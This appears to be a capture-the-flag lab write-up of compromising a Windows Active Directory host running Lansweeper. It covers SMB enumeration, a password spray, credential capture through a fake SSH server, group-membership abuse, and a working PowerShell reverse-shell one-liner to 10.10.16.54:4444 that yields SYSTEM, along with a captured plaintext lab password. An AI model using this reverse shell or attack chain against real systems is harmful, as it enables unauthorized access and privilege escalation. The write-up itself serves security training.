## Lab Details
- Difficulty: Medium
- OS: Windows

## Summary
- Initial access: AD Weak Credentials, Shell Access via Lansweeper Functionalities  
- Privilege escalation: AD Excessive Access, Shell Access via Lansweeper Functionalities

## Enumeration
#### Steps
- run `nmap`
```
$ nmap -Pn -p- -sC -sV 10.129.234.177
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
81/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
82/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: TLS randomness does not represent time
| http-title: Lansweeper - Login
|_Requested resource was /login.aspx
| ssl-cert: Subject: commonName=Lansweeper Secure Website
| Subject Alternative Name: DNS:localhost, DNS:localhost, DNS:localhost
| Not valid before: 2021-11-21T09:22:27
|_Not valid after: 2121-12-21T09:22:27
| tls-alpn:
|_ http/1.1
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-30
10:20:12Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:
sweep.vl0., Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ldapssl?
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:
sweep.vl0., Site: Default-First-Site-Name)
3269/tcp open globalcatLDAPssl?
3389/tcp open ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-07-30T10:21:51+00:00; +16m20s from scanner time.
| ssl-cert: Subject: commonName=inventory.sweep.vl
| Not valid before: 2025-07-27T23:26:33
|_Not valid after: 2026-01-26T23:26:33
5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open mc-nmf .NET Message Framing
9524/tcp open ssl/http Microsoft Kestrel httpd
|_ssl-date: 2025-07-30T10:21:51+00:00; +16m20s from scanner time.
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Kestrel
| tls-alpn:
| h2
|_ http/1.1
| ssl-cert: Subject: commonName=lansweeper-server-communication
| Subject Alternative Name: DNS:localhost, DNS:INVENTORY, DNS:inventory.sweep.vl, IP
Address:192.168.115.145
| Not valid before: 2024-02-08T19:51:08
|_Not valid after: 3024-02-08T19:51:08
49664/tcp open msrpc Microsoft Windows RPC
49668/tcp open msrpc Microsoft Windows RPC
52302/tcp open msrpc Microsoft Windows RPC
59694/tcp open msrpc Microsoft Windows RPC
59707/tcp open msrpc Microsoft Windows RPC
61970/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
61971/tcp open msrpc Microsoft Windows RPC
Service Info: Host: INVENTORY; OS: Windows; CPE: cpe:/o:microsoft:windows
```
- Enumerate target SMB anonymously, identified READ access to `DefaultPackageShare$` & `IPC$`
```
$ smbmap -H 10.129.234.177 -u 'a' -p ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.234.177:445	Name: 10.129.234.177      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DefaultPackageShare$                              	READ ONLY	Lansweeper PackageShare
	IPC$                                              	READ ONLY	Remote IPC
	Lansweeper$                                       	NO ACCESS	Lansweeper Actions
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
[*] Closed 1 connections 
```
- Enumerate file hosting in `DefaultPackageShare$`
```
$ smbclient //10.129.234.177/'DefaultPackageShare$'
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb  8 14:46:04 2024
  ..                                  D        0  Thu Feb  8 14:47:44 2024
  Images                              D        0  Thu Feb  8 14:46:08 2024
  Installers                          D        0  Thu Feb  8 14:46:04 2024
  Scripts                             D        0  Thu Feb  8 14:46:08 2024

		5048575 blocks of size 4096. 1057226 blocks available
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Thu Feb  8 14:46:04 2024
  ..                                  D        0  Thu Feb  8 14:47:44 2024
  Images                              D        0  Thu Feb  8 14:46:08 2024
  Installers                          D        0  Thu Feb  8 14:46:04 2024
  Scripts                             D        0  Thu Feb  8 14:46:08 2024

\Images
  .                                   D        0  Thu Feb  8 14:46:08 2024
  ..                                  D        0  Thu Feb  8 14:46:04 2024
  WindowsLS.jpg                       A   132382  Mon Jan 29 20:47:08 2024

\Installers
  .                                   D        0  Thu Feb  8 14:46:04 2024
  ..                                  D        0  Thu Feb  8 14:46:04 2024

\Scripts
  .                                   D        0  Thu Feb  8 14:46:08 2024
  ..                                  D        0  Thu Feb  8 14:46:04 2024
  CmpDesc.vbs                         A     1119  Mon Jan 29 20:47:08 2024
  CopyFile.vbs                        A      728  Mon Jan 29 20:47:08 2024
  Wallpaper.vbs                       A     1245  Mon Jan 29 20:47:08 2024

		5048575 blocks of size 4096. 1057226 blocks available

```
- Download all the scripts 
```
smb: \> cd Scripts\
smb: \Scripts\> mget *
Get file CmpDesc.vbs? yes
getting file \Scripts\CmpDesc.vbs of size 1119 as CmpDesc.vbs (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
Get file CopyFile.vbs? yes
getting file \Scripts\CopyFile.vbs of size 728 as CopyFile.vbs (1.0 KiloBytes/sec) (average 1.2 KiloBytes/sec)
Get file Wallpaper.vbs? yes
getting file \Scripts\Wallpaper.vbs of size 1245 as Wallpaper.vbs (0.9 KiloBytes/sec) (average 1.1 KiloBytes/sec)
```
- List file contents 
```
$ cat Wallpaper.vbs 
'this script takes 2 arguments ("Source a Destination") 
Source = WScript.Arguments.Item(0)
Destination = WScript.Arguments.Item(1)

Const HKEY_LOCAL_MACHINE = &H80000001
strComputer = "."
Set StdOut = WScript.StdOut
Set oShell = Wscript.CreateObject("WScript.Shell")
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")


Set fso = CreateObject("Scripting.FileSystemObject")
'Check to see if the file already exists in the destination folder
If fso.FileExists(Destination) Then
	'Check to see if the file is read-only
	If Not fso.GetFile(Destination).Attributes And 1 Then 
			fso.CopyFile Source, Destination, True
	Else 
		'The file exists and is read-only.
		fso.GetFile(Destination).Attributes = fso.GetFile(Destination).Attributes - 1
			fso.CopyFile Source, Destination, True
	End If
Else
		fso.CopyFile Source, Destination, True
End If
Set fso = Nothing

strKeyPath = "Control Panel\Desktop"
strValueName = "WallPaper"
strValue = Destination
oReg.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue

RegCommandValue = "RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True"
ReturnVal = oShell.Run (RegCommandValue, 1, True)
```

```
$ cat CopyFile.vbs 
'this script takes 2 arguments => "Source" and "Destination" and uses this to copy a the file
Source = WScript.Arguments.Item(0)
Destination = WScript.Arguments.Item(1)

Set fso = CreateObject("Scripting.FileSystemObject")
'Check to see if the file already exists in the destination folder
If fso.FileExists(Destination) Then
	'Check to see if the file is read-only
	If Not fso.GetFile(Destination).Attributes And 1 Then 
			fso.CopyFile Source, Destination, True
	Else 
		'The file exists and is read-only.
		fso.GetFile(Destination).Attributes = fso.GetFile(Destination).Attributes - 1
			fso.CopyFile Source, Destination, True
	End If
Else
		fso.CopyFile Source, Destination, True
End If
Set fso = Nothing

```

```
$ cat CmpDesc.vbs 
Dim  reg, objRegistry
Dim SN, M, ValueName, strComputer
Const HKLM = &H80000002
strComputer = "."

Set reg = GetObject("winmgmts:\\" & strComputer & "\root\default:StdRegProv")

on error resume next
If WScript.Arguments.count = 0 Then

	Set objRegistry = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2").ExecQuery("Select * FROM 	Win32_OperatingSystem")
	For Each object In objRegistry
		SN = object.SerialNumber 
	Next 

	Set objRegistry = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2").ExecQuery("Select * FROM 	Win32_ComputerSystem")
	For Each object In objRegistry
		M = object.Model
	Next 

	value = M & ": " & SN
	key = "SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
	ValueName = "srvcomment"

	If Len(value) > 48 Then value = Left(value, 48)
	reg.SetStringValue HKLM, key, ValueName, value
Else
	value = WScript.Arguments(0)
	key = "SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
	ValueName = "srvcomment"
	reg.SetStringValue HKLM, key, ValueName, value
End if

```
- Check guest user access 
```
$ nxc smb 10.129.234.177 -u 'guest' -p ''
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\guest: 
$ nxc smb 10.129.234.177 -u '' -p ''
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\: 
```
- Perform `rid-brute` as guest user 
```
$ nxc smb 10.129.234.177 -u 'guest' -p '' --rid-brute | python3 parse.py 
==================================================
RAW nxc OUTPUT
==================================================
SMB                      10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\guest: 
SMB                      10.129.234.177  445    INVENTORY        498: SWEEP\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        500: SWEEP\Administrator (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        501: SWEEP\Guest (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        502: SWEEP\krbtgt (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        512: SWEEP\Domain Admins (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        513: SWEEP\Domain Users (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        514: SWEEP\Domain Guests (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        515: SWEEP\Domain Computers (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        516: SWEEP\Domain Controllers (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        517: SWEEP\Cert Publishers (SidTypeAlias)
SMB                      10.129.234.177  445    INVENTORY        518: SWEEP\Schema Admins (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        519: SWEEP\Enterprise Admins (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        520: SWEEP\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        521: SWEEP\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        522: SWEEP\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        525: SWEEP\Protected Users (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        526: SWEEP\Key Admins (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        527: SWEEP\Enterprise Key Admins (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        553: SWEEP\RAS and IAS Servers (SidTypeAlias)
SMB                      10.129.234.177  445    INVENTORY        571: SWEEP\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      10.129.234.177  445    INVENTORY        572: SWEEP\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      10.129.234.177  445    INVENTORY        1000: SWEEP\INVENTORY$ (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1101: SWEEP\DnsAdmins (SidTypeAlias)
SMB                      10.129.234.177  445    INVENTORY        1102: SWEEP\DnsUpdateProxy (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        1103: SWEEP\Lansweeper Admins (SidTypeGroup)
SMB                      10.129.234.177  445    INVENTORY        1113: SWEEP\jgre808 (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1114: SWEEP\bcla614 (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1115: SWEEP\hmar648 (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1116: SWEEP\jgar931 (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1117: SWEEP\fcla801 (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1118: SWEEP\jwil197 (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1119: SWEEP\grob171 (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1120: SWEEP\fdav736 (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1121: SWEEP\jsmi791 (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1122: SWEEP\hjoh690 (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1123: SWEEP\svc_inventory_win (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1124: SWEEP\svc_inventory_lnx (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        1125: SWEEP\intern (SidTypeUser)
SMB                      10.129.234.177  445    INVENTORY        3101: SWEEP\Lansweeper Discovery (SidTypeGroup)

==================================================
GROUPS
==================================================
Allowed RODC Password Replication Group
Cert Publishers
Cloneable Domain Controllers
Denied RODC Password Replication Group
DnsAdmins
DnsUpdateProxy
Domain Admins
Domain Computers
Domain Controllers
Domain Guests
Domain Users
Enterprise Admins
Enterprise Key Admins
Enterprise Read-only Domain Controllers
Group Policy Creator Owners
Key Admins
Lansweeper Admins
Lansweeper Discovery
Protected Users
RAS and IAS Servers
Read-only Domain Controllers
Schema Admins

==================================================
USERS
==================================================
Administrator
Guest
INVENTORY$
bcla614
fcla801
fdav736
grob171
hjoh690
hmar648
intern
jgar931
jgre808
jsmi791
jwil197
krbtgt
svc_inventory_lnx
svc_inventory_win
```
## Foothold

#### Steps
- Save the usernames from `rid-brute` and perform password spray using usernames as password
- Identified user `intern` is using `intern` as password
```
$ nxc smb 10.129.234.177 -u users -p users --continue-on-success
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\intern:intern 
```
- `intern` user is able to login to `lansweeper` running on port `81` and `82`
![[Pasted image 20260711145612.png]]
- Enumerate target domain using `bloodhound`
```
$bloodhound-ce-python -u intern -p intern -d sweep.vl --zip -c All -dc inventory.sweep.vl -ns 10.129.3.204
```
- Enumerate SMB as `intern` user
```
$smbmap -H 10.129.3.204 -u intern -p intern

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.129.3.204:445        Name: sweep.vl                  Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DefaultPackageShare$                                    READ ONLY       Lansweeper PackageShare
        IPC$                                                    READ ONLY       Remote IPC
        Lansweeper$                                             READ ONLY       Lansweeper Actions
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
[*] Closed 1 connections
```
- `Lansweepers$` contains `dll` and `vbs` scripts
```
$smbclient //10.129.3.204/'Lansweeper$' -U intern%intern
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb  8 14:46:08 2024
  ..                                  D        0  Thu Feb  8 14:47:44 2024
  changeallowed.vbs                   A      704  Mon Jan 29 20:47:08 2024
  changepassword.vbs                  A      604  Mon Jan 29 20:47:08 2024
  CookComputing.XmlRpcV2.dll          A   117000  Mon Jan 29 20:47:08 2024
  Devicetester.exe                    A   859944  Mon Jan 29 20:52:42 2024
  Heijden.Dns.dll                     A    52520  Mon Jan 29 20:52:08 2024
  mustchangepassword.vbs              A      226  Mon Jan 29 20:47:08 2024
  putty.exe                           A  1180904  Mon Jan 29 20:47:08 2024
  shellexec.vbs                       A      107  Mon Jan 29 20:47:08 2024
  SMBLibrary.dll                      A   327976  Mon Jan 29 20:52:10 2024
  testconnection.exe                  A   375592  Mon Jan 29 20:52:46 2024
  unlock.vbs                          A      174  Mon Jan 29 20:47:08 2024
  Utilities.dll                       A    40232  Mon Jan 29 20:52:14 2024
  vimservice25.dll                    A  1170512  Mon Jan 29 20:47:08 2024
  vimservice25.xmlserializers.dll      A  4353104  Mon Jan 29 20:47:08 2024
  vimservice40.dll                    A  1690704  Mon Jan 29 20:47:08 2024
  vimservice40.xmlserializers.dll      A  6630480  Mon Jan 29 20:47:08 2024
  vimservice41.dll                    A  1813584  Mon Jan 29 20:47:08 2024
  vimservice41.xmlserializers.dll      A  7085136  Mon Jan 29 20:47:08 2024
  vimservice50.dll                    A  2079384  Mon Jan 29 20:47:08 2024
  vimservice50.xmlserializers.dll      A  7957144  Mon Jan 29 20:47:08 2024
  vimservice51.dll                    A  2313296  Mon Jan 29 20:47:08 2024
  vimservice51.xmlserializers.dll      A  8395856  Mon Jan 29 20:47:08 2024
  vimservice55.dll                    A  2448464  Mon Jan 29 20:47:08 2024
  vimservice55.xmlserializers.dll      A  8862800  Mon Jan 29 20:47:08 2024
  vmware.vim.dll                      A  1482456  Mon Jan 29 20:47:08 2024
  wol.exe                             A   198040  Mon Jan 29 20:47:08 2024
  XenServer.dll                       A   818976  Mon Jan 29 20:52:40 2024

                5048575 blocks of size 4096. 1058340 blocks available
```
- None seems to be useful
```
smb: \> mget *.vbs
```
- Lansweeper has scan target functionality which we can set the target to our host and capture the scan from Lansweeper 
- First go to Scanning → Scanning Targets and add scanning target
- Set the IP to the attacker IP and the port to a port on attacker host 
![[Pasted image 20260711172231.png]]
- Next we will need to map a credential that will be used to login the attacker host, go to add scanning credential -> map credential then select the type to be IP Range and the range is the ip of attacker then select the `inventory Linux`
![[Pasted image 20260711172314.png]]
- Lastly set up `sshesame`  https://github.com/jaksi/sshesame, a SSH Honeypot which will allow anyone to authenticate to the SSH server and it will log user activities 
```
$cat sshesame.config
server:
  listen_address: 10.10.16.54:202
```
- Hit scan now in scan target we will receive a credential as user `svc_inventory_lnx`
```
$sshesame --config ./sshesame.config
INFO 2026/07/11 04:48:39 No host keys configured, using keys at "/home/ch4os1/.local/share/sshesame"
INFO 2026/07/11 04:48:39 Listening on 10.10.16.54:2022
WARNING 2026/07/11 04:55:13 Failed to establish SSH connection: EOF
WARNING 2026/07/11 04:55:15 Failed to establish SSH connection: ssh: disconnect, reason 11: Session closed
2026/07/11 04:55:16 [10.129.234.177:58309] authentication for user "svc_inventory_lnx" without credentials rejected
2026/07/11 04:55:16 [10.129.234.177:58309] authentication for user "svc_inventory_lnx" with password "0|5m-U6?/uAX" accepted
```
- Confirm the credential using `nxc`
```
$nxc smb 10.129.234.177 -u svc_inventory_lnx -p '0|5m-U6?/uAX'
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\svc_inventory_lnx:0|5m-U6?/uAX
```
- Enumerate the out bound access of user `svc_inventory_lnx`, the user is part of the `lansweeper discovery` group which has `GenericAll` access over `Lansweeper Admin` group
![[Pasted image 20260711165710.png]]
- `lansweeper admins` is belongs to `remote management users` group
![[Pasted image 20260711165732.png]]
- Add intern to the `lansweeper admins`
```
$net rpc group addmem 'LANSWEEPER ADMINS' 'intern' -U 'sweep.vl'/'svc_inventory_lnx'%'0|5m-U6?/uAX' -S "10.129.234.177"
```
- Check with `nxc` against `winrm` we have remote access
```
$nxc winrm 10.129.234.177 -u intern -p intern
WINRM       10.129.234.177  5985   INVENTORY        [*] Windows Server 2022 Build 20348 (name:INVENTORY) (domain:sweep.vl)
WINRM       10.129.234.177  5985   INVENTORY        [+] sweep.vl\intern:intern (Pwn3d!)
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- With `intern` user added to the `lansweeper admins` group login to Lansweeper again, we are granted with additional access
- To obtain a shell access as privilege user we can attempt to add a new deployment package that includes a shell 
- First go to deployment packages -> new package and enter name and description 
![[Pasted image 20260711172430.png]]
- Open the newly created package and add a new step change the action to command and add a powershell payload 
![[Pasted image 20260711172537.png]]

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.54',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- Go back to scan credentials and map a new credential with type of Windows Computer and change the computer name to the domain computer 
![[Pasted image 20260711172814.png]]
- Finally deploy the package 
![[Pasted image 20260711172950.png]]
- A shell is received on listener as `nt authority\system`
```
$nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.4.43 60420

PS C:\Windows\system32> whoami
nt authority\system
```

## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: